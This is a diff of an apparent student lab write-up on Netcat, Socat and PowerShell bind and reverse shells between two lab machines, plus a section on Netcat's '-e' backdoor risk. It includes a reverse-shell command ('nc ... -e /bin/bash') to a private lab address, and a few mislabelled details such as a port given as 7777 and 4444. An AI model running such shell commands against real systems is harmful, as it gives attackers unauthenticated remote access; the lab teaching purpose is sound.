@@ -169,8 +169,23 @@ Now, Netcat has bound TCP port 4444 to bash and will redirect any input, output,
 nc -nv 192.168.0.178 4444
 ```
 
-![Joel's computer](https://github.com/user-attachments/assets/51ebbfbd-be39-450e-845f-e9bbc87865dd)
-![Lesha's computer](https://github.com/user-attachments/assets/eb20ab08-5567-4615-aee3-adeb7f6a67ce)
+**Netcat** example:
+
+![3a_bs_nc_attacker](https://github.com/user-attachments/assets/219bf95f-e1e8-4997-96fa-6b80655285a1)
+![3a_bs_nc_target](https://github.com/user-attachments/assets/c72e2242-49d6-4d79-8ddc-bcb4844758aa)
+
+
+**Socat** example:
+
+![3a_bs_socat_attacker](https://github.com/user-attachments/assets/73045ebd-798b-4700-b096-951b5568273c)
+![3a_bs_socat_target](https://github.com/user-attachments/assets/836b9faf-3e90-48e0-b3b6-8b90a9649e89)
+
+
+**Powershell** example:
+
+![3a_bs_powershell_attacker](https://github.com/user-attachments/assets/83537fb2-0230-4a4d-8d13-4e30284d175f)
+![3a_bs_powershell_target](https://github.com/user-attachments/assets/6fb2e57e-bfe8-40c3-8eb2-1cffaa85fa03)
+
 
 ### Reverse shell
 
@@ -188,8 +203,26 @@ Now, Lesha can send Joel a reverse shell from his Linux machine. Again, we use t
 nc -nv 192.168.0.178 4444 -e /bin/bash
 ```
 
-![Joel's computer](https://github.com/user-attachments/assets/838943c7-c3b7-4b4c-b00f-d8c89aa85767)
-![Lesha's computer](https://github.com/user-attachments/assets/84aced40-3aeb-4d9a-a176-45579d37d8e3)
+**Netcal** example:
+
+![3a_rs_ncat_attacker](https://github.com/user-attachments/assets/726aed85-8abe-4e29-a627-75bdd1b5237c)
+![3a_rs_ncat_target](https://github.com/user-attachments/assets/4d95a82f-0d00-4535-a374-1ed9a4ede03f)
+
+
+**Socat** example:
+![3a_rs_socat_attacker](https://github.com/user-attachments/assets/a7ff0735-c6a7-4c95-9a68-f4f586709e5c)
+![3a_rs_socat_target](https://github.com/user-attachments/assets/31ecc4f3-52c5-4eab-8716-8e35f55316c3)
+
+
+**Powershell** example:
+
+![3a_rs_powercat_attacker](https://github.com/user-attachments/assets/f8bb9223-b112-40a2-83a1-fbcd19e44d14)
+![3a_rs_powercat_target](https://github.com/user-attachments/assets/106a20eb-64e0-4df1-ad95-9631b7f9ead2)
+
+**Powercat** example:
+
+![3a_rs_powercat_attacker](https://github.com/user-attachments/assets/9c6fc7d7-97da-4a8c-9595-203468b392f8)
+![3a_rs_powercat_target](https://github.com/user-attachments/assets/a3e808aa-48e7-42e0-b04e-7e2b624cb441)
 
 
 ## 3.b
@@ -208,5 +241,25 @@ Here's a compact comparison of **Bash**, **sh**, **fish**, **zsh**, and **csh**:
 
 ## 3.c
 
-Netcat has a gaping security hole. It is possible to open network connections without authentication.
+The ability of Netcat to function as a backdoor by enabling an easily exploitable listening service is referred to as the Netcat's "gaping security hole". Netcat has the potential to provide remote users with unauthorized access to a system if it is overused or configured incorrectly. Using the -e option while running Netcat increases the danger significantly because it creates a backdoor by binding a shell to a network port directly. The majority of modern Linux/BSD systems do not have this feature, but since Kali Linux is a penetration testing distribution, the Netcat version that comes with Kali supports the -e option.
+
+### Recreating the Netcat Gaping Security Hole:
+
+On the victim machine, we ran the following command to bind a shell to port 7777 using Netcat:
+
+![3a_bs_nc_target](https://github.com/user-attachments/assets/df5b09cc-e919-48c9-9a56-1554c78cc2a4)
+
+-l: Listen for incoming connections.
+-v: Verbose mode, to provide feedback.
+-p 7777: Bind to port 4444.
+-e /bin/bash: Execute /bin/bash when someone connects to the port, giving direct shell access.
+
+On the attacker’s machine, we made use of Netcat to connect to the victim machine’s IP address and port 7777:
+
+![3a_bs_nc_attacker](https://github.com/user-attachments/assets/8c0a4e82-bdc0-435b-b3d4-88fc084ace59)
+
+Here are some of the security issues that comes up when the netcat's gaping security hole is exploited:
+1. Remote Shell Access: When a shell is bound to a port using the -e flag in Netcat, anyone connecting is given complete command access. This can be fatal if the shell runs with elevated privileges (root, for example).
+2. Lack of Authentication: Netcat lacks encryption and authentication. Anyone who discovers the open port and is connected to the internet can access the shell without a login.
+3. Firewall Evasion: By using frequently approved ports (like 80 and 443), Netcat can be used to bypass firewall limitations and grant attackers access to services that are authorized.
 
